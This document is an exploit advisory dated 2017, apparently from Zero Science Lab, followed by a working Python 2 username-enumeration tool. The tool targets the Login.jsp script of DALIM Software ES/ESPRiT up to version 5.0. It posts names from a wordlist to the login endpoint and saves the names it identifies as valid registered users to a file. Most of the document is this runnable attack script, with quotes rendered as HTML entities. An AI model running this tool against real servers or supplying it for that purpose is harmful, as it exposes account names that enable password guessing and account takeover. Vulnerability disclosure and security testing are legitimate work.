#
#
# DALIM SOFTWARE ES Core 5.0 build 7184.1 User Enumeration Weakness
#
#
# Vendor: Dalim Software GmbH
# Product web page: https://www.dalim.com
# Affected version: ES/ESPRiT 5.0 (build 7184.1)
#                                 (build 7163.2)
#                                 (build 7163.0)
#                                 (build 7135.0)
#                                 (build 7114.1)
#                                 (build 7114.0)
#                                 (build 7093.1)
#                                 (build 7093.0)
#                                 (build 7072.0)
#                                 (build 7051.3)
#                                 (build 7051.1)
#                                 (build 7030.0)
#                                 (build 7009.0)
#                                 (build 6347.0)
#                                 (build 6326.0)
#                                 (build 6305.1)
#                                 (build 6235.9)
#                                 (build 6172.1)
#                   ES/ESPRiT 4.5 (build 6326.0)
#                                 (build 6144.2)
#                                 (build 5180.2)
#                                 (build 5096.0)
#                                 (build 4314.3)
#                                 (build 4314.0)
#                                 (build 4146.4)
#                                 (build 3308.3)
#                   ES/ESPRiT 4.0 (build 4202.0)
#                                 (build 4132.1)
#                                 (build 2235.0)
#                   ES/ESPRiT 3.0
#
# Summary: ES is the new Enterprise Solution from DALIM SOFTWARE built
# from the successful TWIST, DIALOGUE and MISTRAL product lines. The ES
# Core is the engine that can handle project tracking, JDF device workflow,
# dynamic user interface building, volume management. Each ES installation
# will have different features, depending on the license installed: online
#
# ES is a collaborative digital asset production and management platform,
# offering services ranging from online approval to web-based production
# environment for all participants of the production cycle, including brand
# provider. ES lets users plan, execute and control any aspect of media
# production, regardless of the final use of the output (print, web, ebook,
# movie, and others). It ensures productivity and longterm profitability.
#
# Desc: The weakness is caused due to the &#039;Login.jsp&#039; script enumerating
# the list of valid usernames when some characters are provided via the
# &#039;login&#039; parameter.
#
# Tested on: Red Hat Enterprise Linux Server release 7.3 (Maipo)
#            CentOS 7
#            Apache Tomcat/7.0.78
#            Apache Tomcat/7.0.67
#            Apache Tomcat/7.0.42
#            Apache Tomcat/6.0.35
#            Apache-Coyote/1.1
#            Java/1.7.0_80
#            Java/1.6.0_21
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2017-5425
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5425.php
#
#
# 15.06.2017
#
 
 
import argparse
import requests
import sys
 
from colorama import Fore, Back, Style, init
 
init()
 
print &#039;User Enumeration Tool v0.3 for DALiM ES <= v5.0&#039;
parser = argparse.ArgumentParser()
parser.add_argument(&#039;-t&#039;, help=&#039;target IP or hostname&#039;, action=&#039;store&#039;, dest=&#039;target&#039;)
parser.add_argument(&#039;-f&#039;, help=&#039;username wordlist&#039;, action=&#039;store&#039;, dest=&#039;file&#039;)
 
args = parser.parse_args()
if len(sys.argv) != 5:
    parser.print_help()
    sys.exit()
 
host = args.target
fn = args.file
 
try:
    users = open(args.file, &#039;r&#039;)
except(IOError):
    print &#039;[!] Error opening \&#039;&#039; +fn+ &#039;\&#039; file.&#039;
    sys.exit()
lines = users.read().splitlines()
print &#039;[*] Loaded %d usernames for testing.\n&#039; % len(open(fn).readlines())
users.close()
results = open(&#039;validusers.txt&#039;, &#039;w&#039;)
 
for line in lines:
    try:
        r = requests.post("http://" +host+ "/Esprit/public/Login.jsp", data={&#039;actionRole&#039; : &#039;getRoles&#039;, &#039;login&#039; : line})
        print &#039;[+] Testing username: &#039; +Fore.GREEN+line+Fore.RESET
        testingus = r.text[50:72]
        if testingus[19:20] != "\"":
            print &#039;[!] Found &#039; +Style.BRIGHT+Fore.RED+line+Fore.RESET+Style.RESET_ALL+ &#039; as valid registered user.&#039;
            results.write(&#039;%s\n&#039; % line)
    except:
        print &#039;[!] Error connecting to http://&#039;+host
        sys.exit()
 
results.close()
print &#039;\n[*] Enumeration completed!&#039;
print &#039;[*] Valid usernames successfully written to \&#039;validusers.txt\&#039; file.\n&#039;

